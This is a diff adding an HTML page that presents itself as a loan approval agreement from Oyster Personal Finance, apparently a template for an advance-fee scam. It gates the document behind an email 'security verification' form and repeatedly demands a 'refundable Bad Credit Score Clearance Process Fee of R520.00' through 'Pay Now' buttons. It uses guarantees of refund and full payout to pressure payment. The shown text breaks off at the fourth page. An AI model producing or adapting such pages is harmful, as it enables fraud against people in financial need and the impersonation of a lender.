@@ -1,0 +1,1799 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loan Approval Agreement - Oyster Finance</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f5f5f5;
+            overflow-x: hidden;
+            min-height: 100vh;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Email Verification Modal */
+        .verification-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            padding: 20px;
+        }
+
+        .verification-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .verification-title {
+            color: #2563eb;
+            font-size: clamp(20px, 5vw, 28px);
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .verification-subtitle {
+            color: #64748b;
+            font-size: clamp(14px, 4vw, 16px);
+            margin-bottom: 30px;
+        }
+
+        .verification-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .form-group {
+            text-align: left;
+        }
+
+        .form-label {
+            display: block;
+            color: #1e293b;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #2563eb;
+        }
+
+        .verify-btn {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .verify-btn:hover {
+            background: #1d4ed8;
+        }
+
+        .verify-btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+        }
+
+        .error-message {
+            color: #dc2626;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .success-message {
+            color: #16a34a;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* PDF Viewer Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 10px;
+        }
+
+        .pdf-viewer {
+            width: 100%;
+            max-width: 1000px;
+            height: 90vh;
+            background: #525659;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .pdf-header {
+            background: #2d2d2d;
+            color: white;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: auto;
+            min-height: 60px;
+            flex-shrink: 0;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .pdf-title {
+            font-size: clamp(14px, 4vw, 16px);
+            font-weight: bold;
+        }
+
+        .pdf-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .control-btn {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            white-space: nowrap;
+        }
+
+        .control-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .close-btn {
+            background: #ef4444;
+            border: none;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pdf-content-wrapper {
+            flex: 1;
+            overflow: hidden;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            background: #525659;
+            padding: 20px 0;
+        }
+
+        .pdf-content {
+            height: 100%;
+            overflow-y: auto;
+            overflow-x: hidden;
+            scrollbar-width: thin;
+            scrollbar-color: #888 #f1f1f1;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            padding: 0 10px;
+        }
+
+        .pdf-content::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .pdf-content::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+
+        .pdf-content::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 4px;
+        }
+
+        .pdf-content::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        .document-page {
+            width: 100%;
+            max-width: 800px;
+            min-height: 1000px;
+            background: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            transform-origin: top center;
+            flex-shrink: 0;
+            margin-bottom: 20px;
+        }
+
+        .page-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            padding: clamp(15px, 3vw, 40px);
+            overflow-y: auto;
+            font-size: clamp(11px, 1.2vw, 14px);
+            line-height: 1.5;
+        }
+
+        /* Cover Page Styles */
+        .cover-page {
+            background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+        }
+
+        .date-banner {
+            position: absolute;
+            top: clamp(15px, 3vw, 40px);
+            left: 0;
+            background: #2563eb;
+            color: white;
+            padding: clamp(8px, 2vw, 15px) clamp(15px, 3vw, 30px);
+            font-size: clamp(16px, 3vw, 24px);
+            font-weight: bold;
+            clip-path: polygon(0 0, calc(100% - 20px) 0, 100% 100%, 0 100%);
+            min-width: 150px;
+            max-width: 80%;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .wax-seal {
+            position: absolute;
+            top: clamp(15px, 3vw, 40px);
+            right: clamp(15px, 3vw, 40px);
+            width: clamp(50px, 8vw, 80px);
+            height: clamp(50px, 8vw, 80px);
+            background: radial-gradient(circle, #dc2626 0%, #991b1b 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: clamp(8px, 1.5vw, 12px);
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.4);
+        }
+
+        .company-logo {
+            position: absolute;
+            top: 25%;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding: 0 clamp(15px, 3vw, 40px);
+        }
+
+        .logo-text {
+            display: inline-block;
+            vertical-align: middle;
+            font-size: clamp(28px, 6vw, 48px);
+            font-weight: bold;
+            color: #2563eb;
+            letter-spacing: 3px;
+        }
+
+        .logo-subtitle {
+            font-size: clamp(12px, 2.5vw, 16px);
+            color: #64748b;
+            margin-top: 5px;
+            letter-spacing: 2px;
+        }
+
+        .document-title {
+            position: absolute;
+            top: 40%;
+            left: 0;
+            right: 0;
+            text-align: center;
+            padding: 0 clamp(15px, 3vw, 40px);
+        }
+
+        .main-title {
+            font-size: clamp(20px, 4vw, 36px);
+            font-weight: bold;
+            color: #1e293b;
+            margin-bottom: clamp(20px, 3vw, 40px);
+            letter-spacing: 2px;
+        }
+
+        .between-section {
+            font-size: clamp(16px, 3vw, 24px);
+            color: #64748b;
+            margin: clamp(15px, 2.5vw, 30px) 0;
+        }
+
+        .company-name {
+            font-size: clamp(16px, 2.5vw, 20px);
+            font-weight: bold;
+            color: #1e293b;
+            margin: clamp(10px, 1.5vw, 15px) 0;
+        }
+
+        .client-name {
+            font-size: clamp(16px, 2.5vw, 20px);
+            color: #1e293b;
+            margin: clamp(10px, 1.5vw, 15px) 0;
+        }
+
+        .decorative-lines {
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: clamp(30px, 4vw, 60px);
+            background: linear-gradient(45deg, #2563eb 0%, #3b82f6 50%, #60a5fa 100%);
+            clip-path: polygon(0 0, 70% 0, 100% 50%, 70% 100%, 0 100%);
+            opacity: 0.1;
+        }
+
+        .footer-info {
+            position: absolute;
+            bottom: clamp(15px, 3vw, 40px);
+            right: clamp(15px, 3vw, 40px);
+            text-align: right;
+            color: #64748b;
+            font-size: clamp(8px, 1.5vw, 12px);
+            line-height: 1.4;
+            max-width: 80%;
+        }
+
+        /* Page Header Styles */
+        .page-header {
+            text-align: center;
+            margin-bottom: clamp(20px, 3vw, 30px);
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: clamp(15px, 2vw, 20px);
+        }
+
+        .page-title {
+            font-size: clamp(18px, 3.5vw, 28px);
+            font-weight: bold;
+            color: #1e293b;
+            margin-bottom: clamp(10px, 2vw, 15px);
+        }
+
+        .page-subtitle {
+            font-size: clamp(14px, 2.5vw, 18px);
+            color: #64748b;
+            margin-bottom: clamp(10px, 1.5vw, 15px);
+        }
+
+        /* Loan Table Styles */
+        .loan-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: clamp(15px, 2.5vw, 25px) 0;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            table-layout: fixed;
+        }
+
+        .loan-table th {
+            background: #64748b;
+            color: white;
+            padding: clamp(8px, 1.5vw, 12px);
+            text-align: center;
+            font-weight: bold;
+            font-size: clamp(10px, 1.5vw, 12px);
+            word-break: break-word;
+        }
+
+        .loan-table td {
+            background: #f8fafc;
+            padding: clamp(8px, 1.5vw, 12px);
+            text-align: center;
+            font-weight: bold;
+            font-size: clamp(12px, 2vw, 14px);
+            color: #1e293b;
+            word-break: break-word;
+        }
+
+        .loan-table .amount-cell {
+            background: #dcfce7;
+            color: #166534;
+        }
+
+        /* Fee Section Styles */
+        .fee-section {
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: clamp(15px, 2.5vw, 20px);
+            margin: clamp(15px, 2.5vw, 25px) 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .fee-highlight {
+            background: #fbbf24;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: bold;
+            color: #92400e;
+            display: inline-block;
+            margin: 2px 0;
+        }
+
+        .pay-now-btn {
+            background: #dc2626;
+            color: white;
+            border: none;
+            padding: clamp(6px, 1.2vw, 8px) clamp(12px, 2vw, 16px);
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: background 0.3s;
+            font-size: clamp(10px, 1.2vw, 12px);
+            display: inline-block;
+        }
+
+        .pay-now-btn:hover {
+            background: #b91c1c;
+        }
+
+        /* Content Section Styles */
+        .content-section {
+            margin: clamp(15px, 2.5vw, 25px) 0;
+            line-height: 1.6;
+        }
+
+        .section-title {
+            font-size: clamp(16px, 2.8vw, 20px);
+            font-weight: bold;
+            color: #1e293b;
+            margin: clamp(15px, 2.5vw, 20px) 0 clamp(10px, 1.5vw, 15px) 0;
+            border-bottom: 2px solid #2563eb;
+            padding-bottom: 5px;
+        }
+
+        .subsection-title {
+            font-size: clamp(14px, 2.2vw, 16px);
+            font-weight: bold;
+            color: #1e293b;
+            margin: clamp(12px, 2vw, 15px) 0 clamp(8px, 1.2vw, 10px) 0;
+        }
+
+        /* Feature List Styles */
+        .feature-list {
+            list-style: none;
+            padding: 0;
+            margin: clamp(10px, 1.5vw, 15px) 0;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: flex-start;
+            margin: clamp(8px, 1.2vw, 12px) 0;
+            padding: clamp(8px, 1.2vw, 12px);
+            background: #f8fafc;
+            border-radius: 8px;
+            border-left: 4px solid #2563eb;
+        }
+
+        .feature-icon {
+            color: #16a34a;
+            font-size: clamp(14px, 2vw, 16px);
+            margin-right: clamp(8px, 1.2vw, 12px);
+            flex-shrink: 0;
+        }
+
+        .feature-content {
+            flex: 1;
+        }
+
+        .feature-title {
+            font-weight: bold;
+            color: #1e293b;
+            margin-bottom: 5px;
+        }
+
+        /* Highlight Boxes */
+        .highlight-box {
+            background: #dbeafe;
+            border: 2px solid #2563eb;
+            border-radius: 10px;
+            padding: clamp(15px, 2.5vw, 20px);
+            margin: clamp(15px, 2.5vw, 20px) 0;
+            text-align: center;
+        }
+
+        .highlight-title {
+            font-size: clamp(16px, 2.8vw, 20px);
+            font-weight: bold;
+            color: #1e40af;
+            margin-bottom: clamp(8px, 1.2vw, 10px);
+        }
+
+        .refund-box {
+            background: #dcfce7;
+            border: 2px solid #16a34a;
+            border-radius: 10px;
+            padding: clamp(15px, 2.5vw, 20px);
+            margin: clamp(15px, 2.5vw, 20px) 0;
+            text-align: center;
+        }
+
+        .refund-title {
+            font-size: clamp(16px, 2.8vw, 20px);
+            font-weight: bold;
+            color: #15803d;
+            margin-bottom: clamp(8px, 1.2vw, 10px);
+        }
+
+        /* Trust Section */
+        .trust-section {
+            background: #f1f5f9;
+            border-radius: 10px;
+            padding: clamp(15px, 2.5vw, 20px);
+            margin: clamp(15px, 2.5vw, 20px) 0;
+        }
+
+        .trust-title {
+            font-size: clamp(16px, 2.8vw, 20px);
+            font-weight: bold;
+            color: #1e293b;
+            margin-bottom: clamp(10px, 1.5vw, 15px);
+            text-align: center;
+        }
+
+        .trust-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            margin: clamp(8px, 1.2vw, 10px) 0;
+            font-weight: 500;
+        }
+
+        .trust-icon {
+            color: #16a34a;
+            margin-right: clamp(8px, 1.2vw, 10px);
+        }
+
+        /* Signature Page Styles */
+        .signature-page .page-content {
+            position: relative;
+        }
+
+        .declaration-section {
+            margin: clamp(15px, 2.5vw, 25px) 0;
+            line-height: 1.6;
+        }
+
+        .signature-input {
+            border: none;
+            border-bottom: 2px solid #64748b;
+            padding: clamp(5px, 1vw, 8px) clamp(3px, 0.8vw, 5px);
+            font-size: clamp(12px, 1.8vw, 14px);
+            width: 100%;
+            max-width: 300px;
+            margin: 0 5px;
+            background: transparent;
+        }
+
+        .signature-area {
+            display: flex;
+            justify-content: space-between;
+            margin: clamp(30px, 5vw, 50px) 0;
+            align-items: flex-end;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .signature-block {
+            text-align: center;
+            width: 100%;
+            max-width: 45%;
+            min-width: 120px;
+            flex: 1;
+        }
+
+        .signature-line {
+            border-bottom: 2px solid #64748b;
+            height: clamp(40px, 6vw, 60px);
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .signature-image {
+            position: absolute;
+            bottom: 10px;
+            left: 0;
+            width: 100%;
+            height: clamp(25px, 4vw, 35px);
+            font-style: italic;
+            color: #1e293b;
+            font-size: clamp(16px, 3vw, 20px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .signature-label {
+            font-weight: bold;
+            color: #1e293b;
+            margin-top: 10px;
+            font-size: clamp(10px, 1.5vw, 12px);
+        }
+
+        .signature-name {
+            color: #64748b;
+            margin-top: 5px;
+            font-size: clamp(10px, 1.5vw, 12px);
+        }
+
+        .company-seal {
+            text-align: center;
+            margin: clamp(20px, 3vw, 30px) 0;
+        }
+
+        .seal-image {
+            width: clamp(60px, 10vw, 80px);
+            height: clamp(60px, 10vw, 80px);
+            object-fit: contain;
+        }
+
+        .wax-seal-bottom {
+            width: clamp(60px, 10vw, 80px);
+            height: clamp(60px, 10vw, 80px);
+            background: radial-gradient(circle, #dc2626 0%, #991b1b 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: clamp(10px, 2vw, 14px);
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(220, 38, 38, 0.4);
+            margin: 0 auto;
+        }
+
+        .company-footer {
+            margin-top: clamp(20px, 3vw, 30px);
+            text-align: center;
+            color: #64748b;
+            font-size: clamp(8px, 1.2vw, 10px);
+            line-height: 1.4;
+            border-top: 1px solid #e2e8f0;
+            padding-top: clamp(10px, 1.5vw, 15px);
+        }
+
+        /* Payment Modal */
+        .payment-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .payment-content {
+            background: white;
+            padding: clamp(20px, 4vw, 40px);
+            border-radius: 15px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .payment-close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #64748b;
+        }
+
+        .payment-title {
+            color: #2563eb;
+            font-size: clamp(18px, 4vw, 24px);
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .payment-text {
+            color: #64748b;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            font-size: clamp(14px, 2.5vw, 16px);
+        }
+
+        .contact-info {
+            background: #f8fafc;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+            font-weight: bold;
+            color: #1e293b;
+            font-size: clamp(14px, 2.5vw, 16px);
+            flex-wrap: wrap;
+        }
+
+        .contact-icon {
+            margin-right: 10px;
+            font-size: clamp(16px, 2.5vw, 18px);
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 4000;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2563eb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Zoom controls */
+        .zoom-controls {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            display: flex;
+            gap: 10px;
+            z-index: 1010;
+        }
+
+        .zoom-btn {
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .zoom-btn:hover {
+            background: rgba(0, 0, 0, 0.7);
+        }
+
+        .zoom-level {
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            border: none;
+            height: 40px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 15px;
+            font-size: 14px;
+        }
+
+        /* Media Queries for better responsiveness */
+        @media (max-width: 768px) {
+            .pdf-header {
+                padding: 8px;
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .pdf-controls {
+                width: 100%;
+                justify-content: space-between;
+            }
+            
+            .close-btn {
+                position: absolute;
+                top: 8px;
+                right: 8px;
+            }
+            
+            .signature-area {
+                flex-direction: column;
+                align-items: center;
+                gap: 30px;
+            }
+            
+            .signature-block {
+                max-width: 100%;
+            }
+            
+            .fee-section {
+                text-align: center;
+            }
+            
+            .pay-now-btn {
+                display: block;
+                margin: 10px auto;
+                max-width: 200px;
+            }
+
+            .document-page {
+                min-height: auto;
+                height: auto;
+            }
+
+            .page-content {
+                position: relative;
+                height: auto;
+                min-height: 100vh;
+                overflow-y: visible;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .document-title {
+                position: relative;
+                top: auto;
+                margin-top: 100px;
+            }
+            
+            .company-logo {
+                position: relative;
+                top: 80px;
+            }
+            
+            .footer-info {
+                position: relative;
+                bottom: auto;
+                right: auto;
+                margin-top: 30px;
+                text-align: center;
+                max-width: 100%;
+            }
+
+            .feature-item {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .feature-icon {
+                margin-right: 0;
+                margin-bottom: 5px;
+            }
+        }
+
+        /* Print styles */
+        @media print {
+            .modal-overlay,
+            .pdf-header,
+            .control-btn,
+            .close-btn,
+            .zoom-controls,
+            .verification-modal {
+                display: none !important;
+            }
+            
+            .pdf-viewer {
+                width: 100%;
+                height: auto;
+                box-shadow: none;
+                border-radius: 0;
+                background: white;
+            }
+            
+            .pdf-content-wrapper {
+                background: white;
+                padding: 0;
+            }
+            
+            .document-page {
+                box-shadow: none;
+                page-break-after: always;
+                margin: 0;
+                width: 100%;
+                height: auto;
+                min-height: 100vh;
+            }
+            
+            .page-content {
+                position: relative;
+                height: auto;
+                min-height: 100vh;
+                overflow-y: visible;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <!-- Email Verification Modal -->
+    <div class="verification-modal" id="verificationModal">
+        <div class="verification-content">
+            <div class="verification-title">Security Verification</div>
+            <div class="verification-subtitle">Please enter your email address to access your loan approval document</div>
+            
+            <form class="verification-form" id="verificationForm">
+                <div class="form-group">
+                    <label class="form-label" for="userEmail">Email Address</label>
+                    <input type="email" id="userEmail" class="form-input" placeholder="Enter your email address" required>
+                </div>
+                
+                <button type="submit" class="verify-btn" id="verifyBtn">
+                    <i class="fas fa-shield-alt"></i> Verify & View Document
+                </button>
+                
+                <div class="error-message" id="errorMessage"></div>
+                <div class="success-message" id="successMessage"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main PDF Modal -->
+    <div class="modal-overlay" id="documentModal">
+        <div class="pdf-viewer">
+            <div class="pdf-header">
+                <div class="pdf-title">Loan Approval Agreement Document</div>
+                <div class="pdf-controls">
+                    <button class="control-btn" onclick="downloadPDF()">
+                        <i class="fas fa-download"></i> Download PDF
+                    </button>
+                    <button class="control-btn" onclick="window.print()">
+                        <i class="fas fa-print"></i> Print
+                    </button>
+                </div>
+                <button class="close-btn" onclick="closeDocument()">&times;</button>
+            </div>
+            
+            <div class="pdf-content-wrapper">
+                <div class="pdf-content" id="pdfContent">
+                    <!-- Page 1: Cover Page -->
+                    <div class="document-page cover-page">
+                        <div class="page-content">
+                            <div class="date-banner" id="approvalDate">Loading...</div>
+                            <div class="wax-seal">
+                                <img src="https://placeholder.com/seal.png" alt="Company Seal" id="coverSealImage" class="seal-image" style="display: none;">
+                                SEAL
+                            </div>
+                            
+                            <div class="decorative-lines"></div>
+                            
+                            <div class="company-logo">
+                                <img src="https://placeholder.com/logo.png" alt="Company Logo" id="companyLogoImage" class="logo-image" style="display: none;">
+                                <div>
+                                    <span class="logo-text">OYSTER</span>
+                                </div>
+                                <div class="logo-subtitle">FINANCE.</div>
+                            </div>
+                            
+                            <div class="document-title">
+                                <div class="main-title">LOAN AGREEMENT DOCUMENT</div>
+                                
+                                <div class="between-section">BETWEEN</div>
+                                
+                                <div class="company-name">OYSTER PERSONAL FINANCE (PTY) LTD</div>
+                                
+                                <div class="between-section">&</div>
+                                
+                                <div class="client-name" id="clientName">Loading...</div>
+                            </div>
+                            
+                            <div class="footer-info">
+                                <strong>OYSTER FINANCE</strong><br>
+                                A REGISTERED FINANCIAL PROVIDER<br>
+                                NCR:NCRCP11356 – Registration: 2018/317490/07 – FSP No: 50801
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Page 2: Loan Details -->
+                    <div class="document-page">
+                        <div class="page-content">
+                            <div class="page-header">
+                                <div style="text-align: center; margin: 0 0 20px 0;">
+                                    <span class="logo-text" style="font-size: clamp(20px, 4vw, 28px);">OYSTER</span>
+                                    <div class="logo-subtitle">FINANCE.</div>
+                                </div>
+                                
+                                <div class="page-title">LOAN FINALIZATION AGREEMENT DEED</div>
+                                
+                                <div style="text-align: center; margin: 15px 0;">
+                                    <div class="page-subtitle">Between:</div>
+                                    <div style="font-weight: bold; margin: 8px 0;">OYSTER PERSONAL FINANCE (PTY) LTD</div>
+                                    <div class="page-subtitle">&</div>
+                                    <div style="font-weight: bold; margin: 8px 0;" id="clientName2">Loading...</div>
+                                </div>
+                                
+                                <div style="text-align: center; margin: 20px 0; font-weight: bold; font-size: clamp(12px, 2vw, 14px);">
+                                    RE-PAYMENT/PAYBACK SCHEDULE: <span id="loanAmountText">Loading...</span> RANDS for A TERM LOAN OF<br>
+                                    (<span id="loanDurationText">Loading...</span>)
+                                </div>
+                            </div>
+
+                            <table class="loan-table">
+                                <thead>
+                                    <tr>
+                                        <th>LOAN AMOUNT</th>
+                                        <th>LOAN DURATION</th>
+                                        <th>MONTHLY REPAYMENT</th>
+                                        <th>INTEREST RATE</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td class="amount-cell" id="loanAmount">Loading...</td>
+                                        <td id="loanDuration">Loading...</td>
+                                        <td id="monthlyRepayment">Loading...</td>
+                                        <td id="interestRate">Loading...</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+
+                            <div class="fee-section">
+                                <p><strong>The Borrower is required to pay a ONE-TIME REFUNDABLE <span class="fee-highlight">BAD CREDIT SCORE CLEARANCE PROCESS FEE of R520.00</span> 
+                                <button class="pay-now-btn" onclick="showPaymentModal()">Pay Now</button> before the approved loan amount can be disbursed.</strong></p>
+                                
+                                <p style="margin-top: 15px;"><strong>We understand that maintaining a good credit score can sometimes be challenging, and we are here to assist you in accessing the financial support you need.</strong></p>
+                                
+                                <p style="margin-top: 15px;">To help facilitate the disbursement of your approved loan amount, a <span class="fee-highlight">BAD CREDIT SCORE CLEARANCE PROCESS FEE of R520.00</span> 
+                                <button class="pay-now-btn" onclick="showPaymentModal()">Pay Now</button> is required.</p>
+                            </div>
+
+                            <div class="content-section">
+                                <p><strong>This fee serves several important purposes:</strong></p>
+                                <ol style="margin: 15px 0 15px 20px; padding-left: 10px;">
+                                    <li><strong>Loan Security:</strong> It helps secure your loan by addressing potential risks associated with a BAD credit score.</li>
+                                    <li><strong>Credit Enhancement:</strong> The fee contributes to processes aimed at improving your credit score, making it easier for you to access financial services in the future.</li>
+                                    <li><strong>100% Loan Payout Assurance:</strong> By mitigating risks upfront, we can ensure the smooth and complete payout of your approved loan.</li>
+                                </ol>
+
+                                <p>We value transparency and fairness, which is why we assure you that the <span class="fee-highlight">BAD CREDIT SCORE CLEARANCE PROCESS FEE</span> will be fully refunded upon the successful completion of the loan process.</p>
+
+                                <p style="margin-top: 15px;">Thank you for understanding the measures we take to support you and ensure a seamless loan experience. Should you have any questions, please don't hesitate to reach out.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Page 3: Why the Clearance Fee Is Necessary -->
+                    <div class="document-page">
+                        <div class="page-content">
+                            <div class="page-header">
+                                <div style="text-align: center; margin: 0 0 20px 0;">
+                                    <span class="logo-text" style="font-size: clamp(20px, 4vw, 28px);">OYSTER</span>
+                                    <div class="logo-subtitle">FINANCE.</div>
+                                </div>
+                                <div class="page-title">Why the Clearance Fee Is Necessary</div>
+                            </div>
+
+                            <div class="content-section">
+                                <p>At Oyster Personal Finance, we are committed to providing responsible, transparent, and accessible financial solutions to our clients—even those with low or impaired credit scores. To successfully activate your loan and ensure a smooth and guaranteed payout, a once-off Bad Credit Score Clearance Fee is required.</p>
+                                
+                                <p style="margin-top: 15px;"><strong>This fee is not a penalty—it's a protective and empowering measure that enables us to serve you better.</strong></p>
+                            </div>
+
+                            <div class="section-title">Key Benefits of the Clearance Process</div>
+
+                            <ul class="feature-list">
+                                <li class="feature-item">
+                                    <div class="feature-icon">✅</div>
+                                    <div class="feature-content">
+                                        <div class="feature-title">1. Loan Security & Protection</div>
+                                        <p>The fee helps us proactively resolve any red flags on your credit profile that may trigger rejections from our underwriting system. It ensures your loan remains secured, active, and protected throughout the approval pipeline.</p>
+                                    </div>
+                                </li>
+
+                                <li class="feature-item">
+                                    <div class="feature-icon">✅</div>
+                                    <div class="feature-content">
+                                        <div class="feature-title">2. Credit Score Enhancement</div>
+                                        <p>Your fee supports our internal credit improvement program. This includes:</p>
+                                        <ul style="margin: 8px 0 0 20px;">
+                                            <li>Personalized score analysis</li>
+                                            <li>Quick-win credit actions</li>
+                                            <li>Prevention of future rejections</li>
+                                        </ul>
+                                        <p style="margin-top: 8px;">This improvement not only helps release your current loan but also strengthens your profile for future credit access.</p>
+                                    </div>
+                                </li>
+
+                                <li class="feature-item">
+                                    <div class="feature-icon">✅</div>
+                                    <div class="feature-content">
+                                        <div class="feature-title">3. 100% Payout Guarantee</div>
+                                        <p>Without this clearance, even approved loans can face last-minute freezes or technical denials due to unresolved risk flags. This once-off fee ensures zero delays and full disbursement of your approved loan.</p>
+                                    </div>
+                                </li>
+                            </ul>
+
+                            <div class="refund-box">
+                                <div class="refund-title">💡 IMPORTANT: FULL REFUND GUARANTEE</div>
+                                <p>To give you complete peace of mind, we guarantee that this fee will be fully refunded once your loan process is successfully completed. We believe in fairness, transparency, and keeping our promises.</p>
+                            </div>
+
+                            <div class="highlight-box">
+                                <div class="highlight-title">💬 Trusted Support</div>
+                                <p>We understand this process may feel unfamiliar—that's why our experienced support team is here 7 days a week to guide and assist you until your loan is in your hands.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Page 4: Additional Loan Terms -->
+                    <div class="document-page">
+                        <div class="page-content">
